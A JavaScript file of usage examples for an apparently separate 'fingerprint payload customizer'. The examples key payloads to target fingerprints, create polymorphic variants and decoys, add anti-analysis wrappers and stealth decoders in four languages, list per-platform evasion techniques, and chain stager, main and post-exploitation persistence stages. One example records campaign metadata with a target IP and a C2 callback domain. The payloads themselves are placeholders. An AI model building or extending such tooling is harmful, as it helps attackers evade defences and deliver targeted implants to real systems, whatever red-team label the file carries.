/**
 * Fingerprint Payload Customizer - Usage Examples
 *
 * Demonstrates fingerprint-based payload customization techniques
 */

const FingerprintPayloadCustomizer = require('./fingerprint-payload-customizer');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

/**
 * Example 1: Basic payload customization for Linux target
 */
function example_basicLinuxCustomization() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 1: Basic Linux Target Customization');
  console.log('='.repeat(70));

  // Create sample payload
  const payload = Buffer.from('#!/bin/bash\necho "Customized payload"');

  // Linux system fingerprint
  const targetFingerprint = {
    os: 'Linux',
    version: '5.10.0-8-generic',
    arch: 'x86_64',
    cpu: 'Intel(R) Core(TM) i7-8700K CPU @ 3.70GHz',
    cores: 6,
    ram: 16,
    interfaces: 2
  };

  // Create customizer
  const customizer = new FingerprintPayloadCustomizer({
    fingerprintHash: 'linux-target-hash-123'
  });

  // Customize payload
  const customized = customizer.customizeForTarget(
    payload,
    {
      platform: 'linux',
      architecture: 'x64',
      osVersion: '5.10.0-8-generic',
      processorInfo: { model: 'Intel i7-8700K', cores: 6 },
      memoryInfo: { total: 16384 },
      networkInfo: { interfaces: 2 }
    },
    'linux-target-hash-123'
  );

  console.log('Customization Result:');
  console.log(`  ID: ${customized.id}`);
  console.log(`  Platform: ${customized.platform}`);
  console.log(`  Architecture: ${customized.architecture}`);
  console.log(`  Profile: ${customized.profile.name}`);
  console.log(`  Encoding: ${customized.profile.encoding}`);
  console.log(`  Obfuscations:`, customized.obfuscations.join(', '));
  console.log(`  Timestamp: ${new Date(customized.timestamp).toISOString()}`);

  return customized;
}

/**
 * Example 2: Windows target with fingerprint lock
 */
function example_windowsWithLock() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 2: Windows Target with Fingerprint Lock');
  console.log('='.repeat(70));

  // Create payload (Windows PE executable stub)
  const payload = Buffer.from([
    0x4d, 0x5a, 0x90, 0x00, // MZ header
    ...crypto.randomBytes(100)
  ]);

  // Windows system fingerprint
  const windowsFingerprint = 'windows-10-i7-secure-env';

  // Create customizer
  const customizer = new FingerprintPayloadCustomizer({
    fingerprintHash: windowsFingerprint
  });

  // Create fingerprint lock
  const lock = customizer.createFingerprintLock(
    payload,
    windowsFingerprint,
    {
      lockType: 'strict',
      requireExactMatch: true,
      expirationTime: 86400000, // 24 hours
      metadata: {
        targetName: 'WORKSTATION-007',
        targetDomain: 'example.com',
        operator: 'security-team'
      }
    }
  );

  console.log('Fingerprint Lock Created:');
  console.log(`  Lock ID: ${lock.id}`);
  console.log(`  Lock Type: ${lock.metadata.lockType}`);
  console.log(`  Require Exact Match: ${lock.metadata.requireExactMatch}`);
  console.log(`  Expiration: ${new Date(lock.metadata.expirationTime).toISOString()}`);
  console.log(`  Original Checksum: ${lock.checksumOriginal}`);
  console.log(`  Custom Metadata:`, lock.metadata.customMetadata);

  return lock;
}

/**
 * Example 3: Multi-fingerprint polymorphic variants
 */
function example_polymorphicVariants() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 3: Multi-Fingerprint Polymorphic Variants');
  console.log('='.repeat(70));

  const payload = Buffer.from('Polymorphic payload data');

  // Multiple target fingerprints
  const targetFingerprints = [
    'hash-target-linux-production-1',
    'hash-target-windows-staging-2',
    'hash-target-macos-dev-3'
  ];

  const customizer = new FingerprintPayloadCustomizer();

  // Create polymorphic variants
  const variants = customizer.createPolymorphicVariants(
    payload,
    targetFingerprints,
    {
      variantCount: 3,
      minVariation: 0.5, // 50% minimum variation
      includeDecoys: true,
      decoyCount: 2
    }
  );

  console.log(`Total Variants Generated: ${variants.length}`);
  console.log(`  Regular Variants: ${variants.filter(v => !v.isDecoy).length}`);
  console.log(`  Decoy Variants: ${variants.filter(v => v.isDecoy).length}`);

  // Show variant summary
  const typeCount = {};
  for (const variant of variants) {
    const type = variant.isDecoy ? 'decoy' : 'payload';
    typeCount[type] = (typeCount[type] || 0) + 1;
  }

  console.log('\nVariant Summary:');
  for (const [type, count] of Object.entries(typeCount)) {
    console.log(`  ${type}: ${count}`);
  }

  // Show sample variant structure
  console.log('\nSample Variant Structure:');
  const sample = variants[0];
  console.log(`  Variant ID: ${sample.variantId || sample.decoyId}`);
  console.log(`  Fingerprint: ${sample.fingerprint || sample.fingerprint}`);
  console.log(`  Encrypted Data: ${sample.encrypted.data.substring(0, 32)}...`);
  console.log(`  IV: ${sample.encrypted.iv}`);

  return variants;
}

/**
 * Example 4: Create environment-aware wrapper
 */
function example_environmentAwareWrapper() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 4: Environment-Aware Wrapper');
  console.log('='.repeat(70));

  const payload = Buffer.from('Sensitive environment-specific payload');
  const targetFingerprint = 'ubuntu-20.04-intel-8core';

  const customizer = new FingerprintPayloadCustomizer({
    fingerprintHash: targetFingerprint
  });

  // Create wrapped payload with anti-analysis
  const wrapped = customizer.createEnvironmentAwareWrapper(
    payload,
    targetFingerprint
  );

  console.log('Environment-Aware Wrapper Created:');
  console.log(`  Original Size: ${payload.length} bytes`);
  console.log(`  Wrapped Size: ${wrapped.length} bytes`);
  console.log(`  Size Increase: ${((wrapped.length - payload.length) / payload.length * 100).toFixed(2)}%`);
  console.log(`  First 20 bytes: ${wrapped.slice(0, 20).toString('hex')}`);

  return wrapped;
}

/**
 * Example 5: Generate stealthy decoders for multiple languages
 */
function example_stealthyDecoders() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 5: Stealthy Payload Decoders');
  console.log('='.repeat(70));

  const payload = Buffer.from('Stealth payload that executes after verification');
  const targetFingerprint = 'secure-lab-env-2024';

  const customizer = new FingerprintPayloadCustomizer({
    fingerprintHash: targetFingerprint
  });

  // Generate decoders for different languages
  const languages = ['js', 'py', 'cpp', 'go'];
  const decoders = {};

  for (const lang of languages) {
    const decoder = customizer.createStealthDecoder(payload, targetFingerprint, lang);
    decoders[lang] = decoder;

    console.log(`\n${lang.toUpperCase()} Decoder Generated:`);
    console.log(`  Length: ${decoder.length} characters`);
    console.log(`  Includes fingerprint verification: ${decoder.includes('verifyFingerprint')}`);
    console.log(`  Includes payload decoding: ${decoder.includes('decodePayload')}`);
    console.log(`  Sample (first 100 chars):\n    ${decoder.substring(0, 100)}...`);
  }

  return decoders;
}

/**
 * Example 6: Comprehensive fingerprint report
 */
function example_fingerprintReport() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 6: Fingerprint Report Generation');
  console.log('='.repeat(70));

  const payload = Buffer.from('Test payload');
  const fingerprint = 'report-test-target';

  const customizer = new FingerprintPayloadCustomizer({
    fingerprintHash: fingerprint
  });

  // Create customization
  const customized = customizer.customizeForTarget(
    payload,
    {
      platform: 'windows',
      architecture: 'x64',
      osVersion: '10.0.19044',
      processorInfo: { cores: 16, model: 'Intel Xeon' },
      memoryInfo: { total: 32768 },
      networkInfo: { interfaces: 4 }
    },
    fingerprint
  );

  // Generate report
  const report = customizer.generateFingerprintReport(customized.id);

  console.log('Fingerprint Report:');
  console.log(`  Payload ID: ${report.id}`);
  console.log(`  Platform: ${report.platform}`);
  console.log(`  Architecture: ${report.architecture}`);
  console.log(`  Fingerprint Hash: ${report.fingerprintHash}`);
  console.log(`  Profile Name: ${report.profile.name}`);
  console.log(`  Profile Encoding: ${report.profile.encoding}`);
  console.log(`  Available Evasion Techniques:`);
  for (const evasion of report.profile.evasion) {
    console.log(`    - ${evasion}`);
  }
  console.log(`  Obfuscation Techniques:`);
  for (const obfuscation of report.obfuscations) {
    console.log(`    - ${obfuscation}`);
  }
  console.log(`  Checksum: ${report.checksum}`);

  return report;
}

/**
 * Example 7: Export customizations for deployment
 */
function example_exportCustomizations() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 7: Export Customizations for Deployment');
  console.log('='.repeat(70));

  const customizer = new FingerprintPayloadCustomizer({
    fingerprintHash: 'deployment-test'
  });

  // Create several customizations
  const payload = Buffer.from('Deployment payload');

  const platforms = ['windows', 'linux', 'macos'];
  for (const platform of platforms) {
    customizer.customizeForTarget(
      payload,
      { platform, architecture: 'x64' },
      `deployment-test-${platform}`
    );
  }

  // Export all customizations
  const exported = customizer.exportCustomizations();

  console.log('Exported Data Structure:');
  console.log(`  Customizations: ${Object.keys(exported.customizations).length}`);
  console.log(`  Locks: ${Object.keys(exported.locks).length}`);
  console.log(`  Profiles: ${Object.keys(exported.profiles).length}`);

  // Show details
  console.log('\nCustomizations:');
  for (const [id, custom] of Object.entries(exported.customizations)) {
    console.log(`  - ${id}: ${custom.platform} (${custom.architecture})`);
  }

  console.log('\nAvailable Profiles:');
  for (const [platform, profile] of Object.entries(exported.profiles)) {
    console.log(`  - ${platform}: ${profile.name}`);
    console.log(`    Encoding: ${profile.encoding}`);
    console.log(`    Architectures: ${profile.arch.join(', ')}`);
  }

  return exported;
}

/**
 * Example 8: Multi-stage payload customization
 */
function example_multiStageCustomization() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 8: Multi-Stage Payload Customization');
  console.log('='.repeat(70));

  // Stage 1: Stager payload (small, initial loader)
  const stagerPayload = Buffer.from('STAGER: Initial bootstrap code');

  // Stage 2: Main payload (larger, main functionality)
  const mainPayload = Buffer.from('MAIN: Full operational payload');

  // Stage 3: Post-exploitation payload (cleanup, persistence)
  const postexPayload = Buffer.from('POSTEX: Cleanup and persistence code');

  const customizer = new FingerprintPayloadCustomizer({
    fingerprintHash: 'multistage-target'
  });

  const targetProfile = {
    platform: 'linux',
    architecture: 'x64',
    osVersion: '5.15.0',
    processorInfo: { cores: 4 },
    memoryInfo: { total: 8192 },
    networkInfo: { interfaces: 1 }
  };

  console.log('Customizing Multi-Stage Payloads:');

  // Customize each stage
  const stages = [
    { name: 'Stager', payload: stagerPayload, order: 1 },
    { name: 'Main', payload: mainPayload, order: 2 },
    { name: 'PostEx', payload: postexPayload, order: 3 }
  ];

  const customizedStages = [];
  for (const stage of stages) {
    const customized = customizer.customizeForTarget(
      stage.payload,
      targetProfile,
      `multistage-target-stage-${stage.order}`
    );

    customizedStages.push({
      stage: stage.name,
      order: stage.order,
      id: customized.id,
      encrypted: customized.encrypted
    });

    console.log(`  Stage ${stage.order} (${stage.name}):`);
    console.log(`    Payload Size: ${stage.payload.length} bytes`);
    console.log(`    Customization ID: ${customized.id}`);
    console.log(`    Encrypted Data Length: ${customized.encrypted.data.length} chars`);
  }

  // Create execution chain
  const executionChain = {
    stages: customizedStages,
    sequenceId: 'multistage-' + Date.now(),
    targetEnvironment: targetProfile
  };

  console.log('\nExecution Chain:');
  console.log(`  Sequence ID: ${executionChain.sequenceId}`);
  console.log(`  Total Stages: ${executionChain.stages.length}`);
  console.log(`  Execution Order: ${executionChain.stages.map(s => s.stage).join(' -> ')}`);

  return executionChain;
}

/**
 * Example 9: Fingerprint-based delivery selection
 */
function example_deliverySelection() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 9: Fingerprint-Based Delivery Selection');
  console.log('='.repeat(70));

  const customizer = new FingerprintPayloadCustomizer();

  // Simulate different target environments
  const targets = [
    {
      name: 'Windows Corporate',
      fingerprint: 'windows-corp-build-1234',
      profile: { platform: 'windows', arch: 'x64', osVersion: '10.0.19044' }
    },
    {
      name: 'Linux Ubuntu Server',
      fingerprint: 'linux-ubuntu-20.04',
      profile: { platform: 'linux', arch: 'x64', osVersion: '5.10.0' }
    },
    {
      name: 'macOS Development',
      fingerprint: 'macos-dev-12.6',
      profile: { platform: 'macos', arch: 'arm64', osVersion: '12.6' }
    }
  ];

  console.log('Delivery Selection for Different Targets:\n');

  for (const target of targets) {
    const platformProfile = customizer.deliveryProfiles.get(target.profile.platform);

    console.log(`Target: ${target.name}`);
    console.log(`  Fingerprint: ${target.fingerprint}`);
    console.log(`  Platform: ${target.profile.platform}`);
    console.log(`  Delivery Method: ${platformProfile.name}`);
    console.log(`  Encoding: ${platformProfile.encoding}`);
    console.log(`  Evasion Techniques:`);
    for (const tech of platformProfile.evasion) {
      console.log(`    - ${tech}`);
    }
    console.log(`  Obfuscation: ${platformProfile.obfuscation.join(', ')}`);
    console.log();
  }
}

/**
 * Example 10: Security metadata tracking
 */
function example_securityMetadata() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 10: Security Metadata Tracking');
  console.log('='.repeat(70));

  const payload = Buffer.from('Metadata-tracked payload');
  const targetFingerprint = 'security-tracked-env';

  const customizer = new FingerprintPayloadCustomizer({
    fingerprintHash: targetFingerprint
  });

  // Create lock with comprehensive metadata
  const lock = customizer.createFingerprintLock(
    payload,
    targetFingerprint,
    {
      lockType: 'strict',
      expirationTime: 604800000, // 7 days
      metadata: {
        campaignId: 'OPERATION-STEALTH-2024',
        targetId: 'TARGET-00742',
        targetName: 'high-value-server',
        targetDomain: 'enterprise.example.com',
        targetIP: '192.168.1.100',
        operatorId: 'OP-BLUE-TEAM-001',
        timestamp: new Date().toISOString(),
        purpose: 'Red team exercise - authorized',
        duration: '7 days',
        maxExecutions: 10,
        requireNetworkCallback: true,
        callbackDomain: 'c2.internal.corp',
        callbackProtocol: 'https'
      }
    }
  );

  console.log('Security Metadata Captured:');
  const meta = lock.metadata;
  console.log(`  Campaign: ${meta.customMetadata.campaignId}`);
  console.log(`  Target: ${meta.customMetadata.targetId} (${meta.customMetadata.targetName})`);
  console.log(`  Domain: ${meta.customMetadata.targetDomain}`);
  console.log(`  IP Address: ${meta.customMetadata.targetIP}`);
  console.log(`  Operator: ${meta.customMetadata.operatorId}`);
  console.log(`  Created: ${meta.customMetadata.timestamp}`);
  console.log(`  Expires: ${new Date(meta.expirationTime).toISOString()}`);
  console.log(`  Max Executions: ${meta.customMetadata.maxExecutions}`);
  console.log(`  Callback: ${meta.customMetadata.callbackProtocol}://${meta.customMetadata.callbackDomain}`);

  return lock;
}

/**
 * Run all examples
 */
function runAllExamples() {
  console.log('\n' + '█'.repeat(70));
  console.log('█' + ' '.repeat(68) + '█');
  console.log('█' + ' FINGERPRINT PAYLOAD CUSTOMIZER - USAGE EXAMPLES '.padEnd(69) + '█');
  console.log('█' + ' '.repeat(68) + '█');
  console.log('█'.repeat(70));

  try {
    example_basicLinuxCustomization();
    example_windowsWithLock();
    example_polymorphicVariants();
    example_environmentAwareWrapper();
    example_stealthyDecoders();
    example_fingerprintReport();
    example_exportCustomizations();
    example_multiStageCustomization();
    example_deliverySelection();
    example_securityMetadata();

    console.log('\n' + '█'.repeat(70));
    console.log('█' + ' ALL EXAMPLES COMPLETED SUCCESSFULLY '.padEnd(69) + '█');
    console.log('█'.repeat(70) + '\n');
  } catch (error) {
    console.error('\nExample execution error:', error.message);
    console.error(error.stack);
    process.exit(1);
  }
}

// Run examples if executed directly
if (require.main === module) {
  runAllExamples();
}

module.exports = {
  example_basicLinuxCustomization,
  example_windowsWithLock,
  example_polymorphicVariants,
  example_environmentAwareWrapper,
  example_stealthyDecoders,
  example_fingerprintReport,
  example_exportCustomizations,
  example_multiStageCustomization,
  example_deliverySelection,
  example_securityMetadata,
  runAllExamples
};
